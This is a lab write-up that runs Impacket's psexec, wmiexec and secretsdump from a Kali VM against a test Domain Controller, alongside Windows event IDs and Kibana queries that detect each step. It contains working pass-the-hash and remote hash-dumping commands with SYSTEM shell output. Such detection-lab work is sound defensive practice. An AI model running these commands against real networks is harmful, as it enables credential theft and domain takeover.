# Impacket Tools – Nation-State Lab

## 1. Overview

Impacket is a collection of Python classes for working with network protocols. It provides low-level programmatic access to SMB, MSRPC, Kerberos, NTLM, and other Windows protocols. The suite includes several command-line tools that are indispensable for penetration testing and red-team operations.

In this lab, Impacket tools were used primarily for **lateral movement** and **credential theft**:

- `impacket-psexec` – Remote command execution via SMB and PSExec service, used for pass-the-hash attacks.
- `impacket-secretsdump` – Dumping password hashes from remote systems (Domain Controller and workstations) without deploying Mimikatz on disk.
- `impacket-wmiexec` (optional) – Alternative lateral movement method using WMI.

All Impacket tools were executed from the Kali Linux attacker VM (`192.168.1.5`) targeting the Domain Controller (`192.168.1.10`) and workstation systems.

### Why Impacket over other tools?

Impacket is lightweight, agentless, and supports pass-the-hash authentication natively. It is one of the most widely used toolkits for red-team operations in Linux environments.

---

## 2. Installation on Kali Linux

Impacket was installed via the Kali repository:

```bash
sudo apt update
sudo apt install impacket-scripts -y
```

This package includes tools such as:
- psexec.py
- wmiexec.py
- secretsdump.py
- smbclient.py

Tools are installed in `/usr/bin/` and can be executed directly.

### Verification

```bash
impacket-psexec -h
```

Expected output: Help/usage information for PSExec.

---

## 3. Pass-the-Hash Attack with `impacket-psexec`

After extracting the NTLM hash from LSASS memory using Mimikatz (Kiwi module), a pass-the-hash attack was performed.

### 3.1 Extracted Hash

```text
NTLM hash: aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
```

Format: LM:NT  
- LM hash is often dummy in modern systems  
- NT hash is used for authentication  

---

### 3.2 Execute PSExec with Hash

```bash
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 nation/administrator@192.168.1.10
```

| Parameter | Value | Purpose |
|----------|------|--------|
| -hashes | LM:NT | NTLM authentication |
| nation/administrator | User | Domain admin |
| 192.168.1.10 | Target | Domain Controller |

---

### 3.3 Shell Access

```text
C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> hostname
DC
```

Capabilities:
- SYSTEM-level access
- Remote command execution
- Payload deployment

---

### 3.4 Detection in Kibana

| Event ID | Description |
|----------|-------------|
| 4624 | Network logon (Type 3) |
| 4672 | Admin privileges assigned |
| 7045 | PSExec service created |
| 4688 | Process creation |

Kibana Query:

```text
winlog.event_id: 4624 AND winlog.event_data.LogonType: 3 AND winlog.event_data.IpAddress: 192.168.1.5
```

---

## 4. Dumping Hashes with `impacket-secretsdump`

Used for remote credential extraction without uploading binaries.

### 4.1 Command

```bash
impacket-secretsdump -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 nation/administrator@192.168.1.10
```

### Output Includes:
- Local user hashes
- Domain account hashes (krbtgt, users)
- LSA secrets (cached credentials)

---

### 4.2 Detection in Kibana

| Event ID | Description |
|----------|-------------|
| 4656 | Registry access requested |
| 4663 | Object access attempt |
| 5140 | ADMIN$ share access |

---

## 5. Alternative Lateral Movement – `impacket-wmiexec`

### Command

```bash
impacket-wmiexec -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 nation/administrator@192.168.1.10
```

### Key Points:
- Uses WMI (port 135)
- No service creation
- More stealthy than PSExec
- Slower execution

### Detection:
- 4624 logons
- 4688 wmiprvse.exe execution

---

## 6. Attack Chain Integration

| Phase | Tool | Target | Purpose |
|------|------|--------|--------|
| Credential Theft | Mimikatz | WS1 | Extract NTLM hash |
| Remote Dumping | secretsdump | DC | Credential extraction |
| Lateral Movement | psexec | DC | Remote shell |
| Alternative Movement | wmiexec | DC | Stealth access |

---

## 7. Troubleshooting

| Issue | Cause | Fix |
|------|------|-----|
| STATUS_LOGON_FAILURE | Wrong hash | Verify LM:NT format |
| SMB timeout | Port 445 blocked | Disable firewall |
| No shell | PSExec blocked | Use wmiexec |
| Logon failure | Invalid hash | Re-extract credentials |
| Hang issue | Network delay | Restart SMB service |

---

## 8. Summary

| Tool | Purpose | Detection |
|------|--------|----------|
| psexec | Lateral movement | 4624, 4672, 7045 |
| secretsdump | Credential dumping | 4656, 4663, 5140 |
| wmiexec | Stealth movement | 4688 |

---

## Final Conclusion

Impacket tools demonstrated real-world attacker techniques including pass-the-hash execution, remote command execution, and credential dumping. All activities were successfully detected and logged via Winlogbeat and visualized in Kibana, validating the effectiveness of the monitoring system.